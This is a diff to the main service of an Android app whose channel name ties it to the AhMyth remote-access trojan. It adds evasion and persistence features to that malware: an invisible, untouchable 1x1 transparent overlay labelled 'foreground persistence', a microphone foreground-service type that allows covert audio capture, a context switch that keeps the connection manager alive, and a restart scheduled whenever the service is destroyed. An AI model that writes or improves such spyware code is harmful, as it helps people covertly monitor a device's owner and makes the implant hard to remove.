@@ -26,6 +26,10 @@ public class MainService extends Service {
     private static final int NOTIFICATION_ID = 1;
     private static final String CHANNEL_ID = "ahmyth_service_channel";
     
+    // Overlay view for foreground persistence (1px transparent)
+    private android.view.WindowManager windowManager;
+    private android.view.View overlayView;
+    
     private static Context contextOfApplication;
     private PowerManager.WakeLock wakeLock;
     private boolean isRunning = false;
@@ -91,6 +95,9 @@ public class MainService extends Service {
         
         // Acquire wake lock to keep service running
         acquireWakeLock();
+        
+        // Create 1px overlay if permission granted
+        createOverlay();
     }
 
     @Override
@@ -102,6 +109,21 @@ public class MainService extends Service {
     public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
         Log.d(TAG, "Service onStartCommand - SDK: " + Build.VERSION.SDK_INT);
         
+        // Ensure overlay exists
+        if (overlayView == null) {
+            createOverlay();
+        }
+
+        // Always update context to Service context to avoid holding onto dead Activity context
+        try {
+            if (ConnectionManager.context instanceof android.app.Activity) {
+                Log.d(TAG, "Updating ConnectionManager context to Service context");
+                ConnectionManager.context = this;
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error updating context", e);
+        }
+
         if (isRunning) {
             Log.d(TAG, "Service already running");
             return Service.START_STICKY;
@@ -179,11 +201,11 @@ public class MainService extends Service {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 // Android 14+ requires specific foreground service types
                 startForeground(NOTIFICATION_ID, notification, 
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 // Android 10-13
                 startForeground(NOTIFICATION_ID, notification, 
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC | ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
             } else {
                 // Android 9 and below
                 startForeground(NOTIFICATION_ID, notification);
@@ -264,10 +286,70 @@ public class MainService extends Service {
         isRunning = false;
         releaseWakeLock();
         
+        // Remove overlay
+        removeOverlay();
+        
         // Schedule restart
         scheduleRestart();
         
         super.onDestroy();
+    }
+    
+    private void createOverlay() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && 
+                !android.provider.Settings.canDrawOverlays(this)) {
+                Log.w(TAG, "Cannot create overlay - permission missing");
+                return;
+            }
+            
+            if (overlayView != null) {
+                return; // Already created
+            }
+            
+            windowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
+            
+            int type = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
+                android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                android.view.WindowManager.LayoutParams.TYPE_PHONE;
+                
+            android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
+                1, 1, // 1x1 pixel
+                type,
+                android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+                android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                android.graphics.PixelFormat.TRANSLUCENT
+            );
+            
+            params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
+            params.x = 0;
+            params.y = 0;
+            params.alpha = 0.0f; // Transparent
+            
+            overlayView = new android.view.View(this);
+            overlayView.setBackgroundColor(Color.TRANSPARENT);
+            
+            windowManager.addView(overlayView, params);
+            Log.d(TAG, "1x1 Overlay created successfully");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error creating overlay", e);
+        }
+    }
+    
+    private void removeOverlay() {
+        try {
+            if (windowManager != null && overlayView != null) {
+                windowManager.removeView(overlayView);
+                overlayView = null;
+                Log.d(TAG, "Overlay removed");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error removing overlay", e);
+        }
     }
 
     public static Context getContextOfApplication() {
